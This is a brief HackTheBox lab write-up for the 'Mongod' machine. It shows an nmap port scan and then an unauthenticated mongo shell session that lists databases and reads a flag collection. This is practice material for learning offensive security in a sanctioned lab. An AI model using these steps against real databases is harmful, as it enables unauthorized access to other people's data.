Mongod

HackTheBox, Very Easy

Mongod works with MongoDB, a document-oriented NoSQL database (port 27017). The instance requires no credentials.

Reconnaissance

A full scan reveals MongoDB on port 27017.

nmap -p- --min-rate=1000 -sV <IP>

Exploitation

Using the mongo shell we connect without authentication. Listing the databases reveals one named sensitive_information, whose collection stores the flag.

mongo mongodb://<IP>:27017
show dbs
use sensitive_information
show collections
db.flag.find().pretty()
